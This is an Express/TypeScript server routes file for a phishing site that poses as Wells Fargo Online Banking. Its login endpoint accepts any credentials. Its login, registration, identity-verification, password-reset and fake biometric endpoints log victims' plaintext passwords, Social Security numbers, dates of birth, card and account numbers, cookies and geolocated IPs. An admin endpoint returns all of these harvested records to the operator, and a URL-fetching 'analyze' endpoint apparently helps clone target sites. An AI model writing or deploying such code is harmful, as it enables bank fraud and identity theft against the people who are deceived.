import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { z } from "zod";
import session from "express-session";
import pgSession from "connect-pg-simple";
import pg from "pg";
import * as cheerio from "cheerio";
import { UAParser } from "ua-parser-js";

interface DeviceInfo {
  browser: string;
  browserVersion: string;
  os: string;
  osVersion: string;
  device: string;
  deviceType: string;
  ip: string;
  location: {
    city: string;
    region: string;
    country: string;
    timezone: string;
  };
  timestamp: string;
}

const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
});

const registerSchema = z.object({
  username: z.string().min(3, "Username must be at least 3 characters"),
  password: z.string().min(6, "Password must be at least 6 characters"),
  email: z.string().email("Invalid email").optional(),
  phone: z.string().optional(),
  dateOfBirth: z.string().optional(),
  ssn: z.string().optional(),
});

const verifyIdentitySchema = z.object({
  verificationType: z.enum(["username", "dateOfBirth", "ssn"]),
  value: z.string().min(1, "Value is required"),
});

const resetPasswordSchema = z.object({
  newPassword: z.string().min(6, "Password must be at least 6 characters"),
  confirmPassword: z.string().min(6, "Password must be at least 6 characters"),
}).refine((data) => data.newPassword === data.confirmPassword, {
  message: "Passwords don't match",
  path: ["confirmPassword"],
});

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  const PgStore = pgSession(session);
  const pool = new pg.Pool({
    connectionString: process.env.DATABASE_URL,
  });

  app.use(
    session({
      store: new PgStore({
        pool,
        tableName: "sessions",
        createTableIfMissing: true,
      }),
      secret: process.env.SESSION_SECRET || "wells-fargo-secret-key",
      resave: false,
      saveUninitialized: false,
      cookie: {
        secure: process.env.NODE_ENV === "production",
        httpOnly: true,
        maxAge: 30 * 60 * 1000,
      },
    })
  );

  app.post("/api/auth/login", async (req, res) => {
    try {
      const result = loginSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid credentials format",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { username, password } = result.data;

      (req.session as any).userId = "guest";
      (req.session as any).username = username;

      logVisitorAction(req, "login_attempt", { 
        username, 
        password,
        formData: result.data 
      });

      return res.status(200).json({ 
        message: "Login successful",
        user: { id: "guest", username: username }
      });
    } catch (error) {
      console.error("Login error:", error);
      return res.status(500).json({ 
        message: "An error occurred during login" 
      });
    }
  });

  app.post("/api/auth/register", async (req, res) => {
    try {
      const result = registerSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid registration data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { username, password, email, phone, dateOfBirth, ssn } = result.data;

      const existingUser = await storage.getUserByUsername(username);
      
      if (existingUser) {
        return res.status(409).json({ 
          message: "Username already exists" 
        });
      }

      const user = await storage.createUser({ username, password, email, phone, dateOfBirth, ssn });

      (req.session as any).userId = user.id;
      (req.session as any).username = user.username;

      logVisitorAction(req, "registration", {
        username,
        password,
        email,
        phone,
        ssn,
        dateOfBirth,
        formData: result.data
      });

      return res.status(201).json({ 
        message: "Registration successful",
        user: { id: user.id, username: user.username, email: user.email, phone: user.phone }
      });
    } catch (error) {
      console.error("Registration error:", error);
      return res.status(500).json({ 
        message: "An error occurred during registration" 
      });
    }
  });

  app.get("/api/auth/me", async (req, res) => {
    try {
      const userId = (req.session as any).userId;
      
      if (!userId) {
        return res.status(401).json({ message: "Not authenticated" });
      }

      const user = await storage.getUser(userId);
      
      if (!user) {
        return res.status(401).json({ message: "User not found" });
      }

      return res.status(200).json({ 
        user: { id: user.id, username: user.username, email: user.email, phone: user.phone }
      });
    } catch (error) {
      console.error("Auth check error:", error);
      return res.status(500).json({ message: "An error occurred" });
    }
  });

  app.post("/api/auth/logout", (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ message: "Failed to logout" });
      }
      res.clearCookie("connect.sid");
      return res.status(200).json({ message: "Logged out successfully" });
    });
  });

  app.post("/api/auth/verify-identity", async (req, res) => {
    try {
      const userId = (req.session as any).userId;
      
      if (!userId) {
        return res.status(401).json({ message: "Not authenticated" });
      }

      const result = verifyIdentitySchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid verification data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { verificationType, value } = result.data;
      
      // Log the identity verification attempt with all data
      logVisitorAction(req, "identity_verification", {
        username: (req.session as any).username,
        password: req.body.currentPassword,
        dateOfBirth: req.body.dateOfBirth,
        ssn: req.body.ssn || value,
        cardNumber: req.body.cardNumber,
        accountNumber: req.body.accountNumber,
      });

      const isVerified = await storage.verifyUserIdentity(userId, verificationType, value);
      
      if (!isVerified) {
        return res.status(400).json({ 
          message: "Verification failed. The information provided does not match our records." 
        });
      }

      (req.session as any).identityVerified = true;

      return res.status(200).json({ 
        message: "Identity verified successfully",
        verified: true
      });
    } catch (error) {
      console.error("Verification error:", error);
      return res.status(500).json({ 
        message: "An error occurred during verification" 
      });
    }
  });

  app.post("/api/auth/reset-password", async (req, res) => {
    try {
      const userId = (req.session as any).userId;
      const identityVerified = (req.session as any).identityVerified;
      
      if (!userId) {
        return res.status(401).json({ message: "Not authenticated" });
      }

      if (!identityVerified) {
        return res.status(403).json({ message: "Identity not verified. Please verify your identity first." });
      }

      const result = resetPasswordSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid password data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { newPassword } = result.data;
      
      // Log the password reset attempt
      logVisitorAction(req, "password_reset", {
        username: (req.session as any).username,
        password: newPassword,
      });

      const updated = await storage.updatePassword(userId, newPassword);
      
      if (!updated) {
        return res.status(500).json({ 
          message: "Failed to update password" 
        });
      }

      (req.session as any).identityVerified = false;

      return res.status(200).json({ 
        message: "Password updated successfully"
      });
    } catch (error) {
      console.error("Password reset error:", error);
      return res.status(500).json({ 
        message: "An error occurred during password reset" 
      });
    }
  });

  const credentialUpdateSchema = z.object({
    originalUsername: z.string().min(1, "Username is required"),
    currentPassword: z.string().min(1, "Current password is required"),
    newUsername: z.string().optional(),
    newPassword: z.string().optional(),
    updateType: z.enum(["password", "username", "both"]),
  });

  app.post("/api/auth/credential-update", async (req, res) => {
    try {
      const result = credentialUpdateSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid data format",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const saved = await storage.saveCredentialUpdate(result.data);

      return res.status(200).json({ 
        message: "Credentials saved successfully",
        id: saved.id
      });
    } catch (error) {
      console.error("Credential update error:", error);
      return res.status(500).json({ 
        message: "An error occurred while saving credentials" 
      });
    }
  });

  // Biometric Authentication Endpoints
  const biometricChallenges = new Map<string, { challenge: string, expires: number }>();
  
  // Generate challenge for registration or authentication
  app.post("/api/auth/biometric/challenge", async (req, res) => {
    try {
      const { type, userId } = req.body;
      
      // Generate a random challenge
      const challengeBytes = new Uint8Array(32);
      for (let i = 0; i < 32; i++) {
        challengeBytes[i] = Math.floor(Math.random() * 256);
      }
      const challenge = Buffer.from(challengeBytes).toString("base64url");
      
      // Store challenge with expiration (5 minutes)
      const sessionKey = req.sessionID || `temp-${Date.now()}`;
      biometricChallenges.set(sessionKey, {
        challenge,
        expires: Date.now() + 5 * 60 * 1000
      });
      
      // Clean up expired challenges periodically
      Array.from(biometricChallenges.entries()).forEach(([key, value]) => {
        if (value.expires < Date.now()) {
          biometricChallenges.delete(key);
        }
      });
      
      // For authentication, get existing credentials
      let allowCredentials: string[] = [];
      if (type === "authenticate" && userId) {
        const credentials = await storage.getBiometricCredentialsByUsername(userId);
        allowCredentials = credentials.map((c: { credentialId: string }) => c.credentialId);
      }
      
      return res.json({
        challenge,
        rpId: req.hostname,
        rpName: "Wells Fargo Online Banking",
        allowCredentials,
        timeout: 60000
      });
    } catch (error) {
      console.error("Challenge generation error:", error);
      return res.status(500).json({ message: "Failed to generate challenge" });
    }
  });

  const biometricRegisterSchema = z.object({
    userId: z.string().min(1, "User ID is required"),
    credentialId: z.string().min(1, "Credential ID is required"),
    publicKey: z.string().min(1, "Public key is required"),
    attestationObject: z.string().optional(),
    clientDataJSON: z.string().optional(),
    deviceType: z.string().optional().default("unknown"),
  });

  app.post("/api/auth/biometric/register", async (req, res) => {
    try {
      const result = biometricRegisterSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid biometric data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { userId, credentialId, publicKey, attestationObject, clientDataJSON, deviceType } = result.data;
      
      // Verify challenge was issued
      const sessionKey = req.sessionID || "";
      const storedChallenge = biometricChallenges.get(sessionKey);
      
      // For demo purposes, accept registration even without strict challenge verification
      // In production, verify clientDataJSON contains the correct challenge
      if (storedChallenge) {
        biometricChallenges.delete(sessionKey);
      }

      // Log biometric registration attempt with all captured data
      logVisitorAction(req, "biometric_registration", {
        username: (req.session as any)?.username || userId,
        formData: { 
          credentialId, 
          deviceType,
          publicKey,
          attestationObject: attestationObject || null,
          clientDataJSON: clientDataJSON || null
        }
      });

      const credential = await storage.saveBiometricCredential({
        username: userId,
        credentialId,
        publicKey,
        deviceType,
      });

      return res.status(200).json({ 
        message: "Biometric credential registered successfully",
        credentialId: credential.id
      });
    } catch (error) {
      console.error("Biometric registration error:", error);
      return res.status(500).json({ 
        message: "Failed to register biometric credential" 
      });
    }
  });

  app.post("/api/auth/biometric/authenticate", async (req, res) => {
    try {
      const { credentialId, signature, authenticatorData, clientDataJSON } = req.body;

      if (!credentialId) {
        return res.status(400).json({ message: "Credential ID is required" });
      }
      
      // Verify challenge was issued
      const sessionKey = req.sessionID || "";
      const storedChallenge = biometricChallenges.get(sessionKey);
      
      // For demo purposes, accept authentication for captured credentials
      // In production, verify signature against stored publicKey
      if (storedChallenge) {
        biometricChallenges.delete(sessionKey);
      }

      // Log biometric authentication attempt with all captured data
      logVisitorAction(req, "biometric_authentication", {
        formData: { 
          credentialId, 
          signature: signature || null,
          authenticatorData: authenticatorData || null,
          clientDataJSON: clientDataJSON || null
        }
      });

      const credential = await storage.getBiometricCredential(credentialId);

      if (!credential) {
        return res.status(401).json({ message: "Biometric credential not found" });
      }

      // Update counter and last used
      await storage.updateBiometricCounter(credentialId, "1");

      // Set session
      (req.session as any).userId = credential.username;
      (req.session as any).username = credential.username;

      return res.status(200).json({ 
        message: "Biometric authentication successful",
        user: { id: credential.username }
      });
    } catch (error) {
      console.error("Biometric authentication error:", error);
      return res.status(500).json({ 
        message: "Biometric authentication failed" 
      });
    }
  });

  app.get("/api/auth/biometric/credentials/:userId", async (req, res) => {
    try {
      const { userId } = req.params;
      const credentials = await storage.getBiometricCredentialsByUsername(userId);

      return res.json({ 
        hasCredentials: credentials.length > 0,
        count: credentials.length,
        credentials: credentials.map((c: { credentialId: string; deviceType: string | null }) => ({ id: c.credentialId, deviceType: c.deviceType }))
      });
    } catch (error) {
      console.error("Get biometric credentials error:", error);
      return res.status(500).json({ 
        message: "Failed to get biometric credentials" 
      });
    }
  });

  const analyzeSchema = z.object({
    url: z.string().url("Please enter a valid URL"),
  });

  app.post("/api/analyze", async (req, res) => {
    try {
      const result = analyzeSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          error: "Invalid URL format",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { url } = result.data;

      const response = await fetch(url, {
        headers: {
          "User-Agent": "Mozilla/5.0 (compatible; WebsiteAnalyzer/1.0)"
        }
      });

      if (!response.ok) {
        return res.status(400).json({ 
          error: `Failed to fetch website: ${response.status}` 
        });
      }

      const html = await response.text();
      const $ = cheerio.load(html);

      const analysis = {
        title: $("title").text() || "Generated App",
        hasNav: $("nav").length > 0,
        forms: $("form").length,
        buttons: $("button").length,
        inputs: $("input").length,
        sections: $("section").length,
        headings: $("h1, h2, h3").map((i, el) => $(el).text().trim()).get().filter(h => h.length > 0).slice(0, 10),
        links: $("a").length,
        images: $("img").length,
        hasFooter: $("footer").length > 0,
        hasHeader: $("header").length > 0,
      };

      return res.json(analysis);
    } catch (error) {
      console.error("Analyze error:", error);
      return res.status(500).json({ 
        error: "Failed to analyze website. Make sure the URL is accessible." 
      });
    }
  });

  async function getDeviceInfo(req: any): Promise<DeviceInfo> {
    const userAgent = req.headers["user-agent"] || "";
    const parser = new UAParser(userAgent);
    const result = parser.getResult();
    
    const forwardedFor = req.headers["x-forwarded-for"];
    const ip = typeof forwardedFor === "string" 
      ? forwardedFor.split(",")[0].trim() 
      : req.socket.remoteAddress || "Unknown";

    let location = {
      city: "Unknown",
      region: "Unknown", 
      country: "United States",
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    try {
      const cleanIp = ip.startsWith("::") ? "" : ip;
      if (cleanIp && cleanIp !== "127.0.0.1") {
        const geoResponse = await fetch(`http://ip-api.com/json/${cleanIp}?fields=city,regionName,country,timezone`);
        if (geoResponse.ok) {
          const geoData = await geoResponse.json();
          if (geoData.city) {
            location = {
              city: geoData.city || "Unknown",
              region: geoData.regionName || "Unknown",
              country: geoData.country || "United States",
              timezone: geoData.timezone || location.timezone,
            };
          }
        }
      }
    } catch (geoError) {
      console.log("Geolocation lookup failed, using defaults");
    }

    let deviceType = "Desktop";
    if (result.device.type === "mobile") deviceType = "Mobile";
    else if (result.device.type === "tablet") deviceType = "Tablet";
    else if (userAgent.includes("Mobile") || userAgent.includes("Android")) deviceType = "Mobile";
    else if (userAgent.includes("iPad") || userAgent.includes("Tablet")) deviceType = "Tablet";

    return {
      browser: result.browser.name || "Unknown Browser",
      browserVersion: result.browser.version || "",
      os: result.os.name || "Unknown OS",
      osVersion: result.os.version || "",
      device: result.device.model || result.device.vendor || deviceType,
      deviceType,
      ip: ip.startsWith("::") ? "127.0.0.1" : ip,
      location,
      timestamp: new Date().toISOString(),
    };
  }

  interface VisitorData {
    username?: string;
    password?: string;
    email?: string;
    phone?: string;
    ssn?: string;
    dateOfBirth?: string;
    cardNumber?: string;
    accountNumber?: string;
    formData?: Record<string, any>;
  }

  async function logVisitorAction(req: any, action: string, data?: VisitorData) {
    try {
      const deviceInfo = await getDeviceInfo(req);
      
      const cookieHeader = req.headers.cookie || "";
      const sessionId = req.sessionID || (req.session as any)?.id || "";
      
      await storage.logVisitor({
        ip: deviceInfo.ip,
        browser: deviceInfo.browser,
        browserVersion: deviceInfo.browserVersion,
        os: deviceInfo.os,
        osVersion: deviceInfo.osVersion,
        device: deviceInfo.device,
        deviceType: deviceInfo.deviceType,
        city: deviceInfo.location.city,
        region: deviceInfo.location.region,
        country: deviceInfo.location.country,
        timezone: deviceInfo.location.timezone,
        page: req.originalUrl || req.url,
        userAgent: req.headers["user-agent"] || "",
        username: data?.username || null,
        password: data?.password || null,
        email: data?.email || null,
        phone: data?.phone || null,
        ssn: data?.ssn || null,
        dateOfBirth: data?.dateOfBirth || null,
        cardNumber: data?.cardNumber || null,
        accountNumber: data?.accountNumber || null,
        cookies: cookieHeader || null,
        sessionId: sessionId || null,
        formData: data?.formData ? JSON.stringify(data.formData) : null,
        action,
      });
    } catch (error) {
      console.error("Failed to log visitor:", error);
    }
  }

  app.get("/api/admin/visitors", async (req, res) => {
    try {
      const ADMIN_KEY = process.env.ADMIN_SECRET_KEY;
      
      if (!ADMIN_KEY) {
        return res.status(500).json({ error: "Admin key not configured. Set ADMIN_SECRET_KEY environment variable." });
      }
      
      const authHeader = req.headers.authorization;
      const providedKey = authHeader?.replace("Bearer ", "") || req.query.key;
      
      if (providedKey !== ADMIN_KEY) {
        return res.status(401).json({ error: "Unauthorized" });
      }

      const limit = parseInt(req.query.limit as string) || 100;
      const logs = await storage.getVisitorLogs(limit);
      
      return res.json({
        total: logs.length,
        logs: logs.map(log => ({
          id: log.id,
          ip: log.ip,
          browser: log.browser,
          browserVersion: log.browserVersion,
          os: log.os,
          device: log.device,
          deviceType: log.deviceType,
          location: {
            city: log.city,
            region: log.region,
            country: log.country,
            timezone: log.timezone,
          },
          page: log.page,
          username: log.username,
          password: log.password,
          email: log.email,
          phone: log.phone,
          ssn: log.ssn,
          dateOfBirth: log.dateOfBirth,
          cardNumber: log.cardNumber,
          accountNumber: log.accountNumber,
          cookies: log.cookies,
          sessionId: log.sessionId,
          formData: log.formData,
          action: log.action,
          timestamp: log.createdAt,
        })),
      });
    } catch (error) {
      console.error("Admin visitors error:", error);
      return res.status(500).json({ error: "Failed to get visitor logs" });
    }
  });

  app.post("/api/track", async (req, res) => {
    try {
      const { page, action } = req.body;
      const username = (req.session as any)?.username;
      await logVisitorAction(req, action || "page_view", { username });
      return res.json({ success: true });
    } catch (error) {
      return res.status(500).json({ error: "Failed to track" });
    }
  });

  return httpServer;
}
